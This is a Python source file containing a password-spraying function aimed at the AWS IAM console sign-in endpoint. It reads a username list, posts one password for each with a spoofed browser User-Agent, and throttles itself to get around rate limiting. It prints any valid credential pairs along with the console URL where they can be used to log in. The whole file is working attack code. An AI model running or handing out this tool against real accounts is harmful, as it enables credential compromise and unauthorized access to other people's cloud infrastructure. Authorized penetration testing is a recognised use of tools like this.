import requests
import time


def spray(args):
    found_creds = 0
    if args.timeout:
        timeout = args.timeout
    else:
        timeout = 2
    print('Password spraying provided IAM usernames. Please be patient...')
    session = requests.session()
    with open(args.read) as input_usernames:
        for line in input_usernames:
            username = line.strip()
            aws_signing_url = "https://signin.aws.amazon.com:443/authenticate"
            headers = {"User-Agent": "Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64) AppleWebKit/533.50 (KHTML, like Gecko) Chrome/49.0.2181.363 Safari/601.3 Edge/15.29600",
                       "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate, br"}
            data = {"account": args.account, "action": "iam-user-authentication", "client_id": "arn:aws:signin:::console/canvas",
                    "password": args.password, "redirect_uri": "https://console.aws.amazon.com", "rememberAccount": "false", "username": username}
            time.sleep(int(timeout))
            response = session.post(
                aws_signing_url, data=data, headers=headers)
            try:
                response_data = response.json()
                if args.verbose:
                    print(f"Username: {username}")
                    print(response_data)
            except:
                print('AWS is rate limiting attempts most likely. Pausing for 30 seconds and adding a 5 second timeout between attempts.')
                time.sleep(20)
                timeout = 10
            usercreds = f"{username}:{args.password}"
            if "SUCCESS" in response_data.get('state') and "CHANGE_PASSWORD" in response_data.get('properties').get('result'):
                found_creds = found_creds + 1
                print(
                    f"[+]Valid Credentials Found! - {usercreds} - Password Change REQUIRED")
                print(
                    f"Visit https://{args.account}.signin.aws.amazon.com/console and log in with the credentials {usercreds}.")
                continue_check = input("Do you want to continue? (y/n) ")
                if continue_check.lower() == "y":
                    continue
                else:
                    print("Quitting...")
                    quit()
            elif "SUCCESS" in response_data.get('state') and "CHANGE_PASSWORD" not in response_data.get('properties', {}).get('result'):
                found_creds = found_creds + 1
                print(
                    f"[+]Valid Credentials Found! - {usercreds}")
                continue_check = input("Do you want to continue? (y/n) ")
                if continue_check.lower() == "y":
                    continue
                else:
                    print("Quitting...")
                    quit()
            else:
                pass
    print(f"{found_creds} pair of user credentials identified during scan. Quitting...")
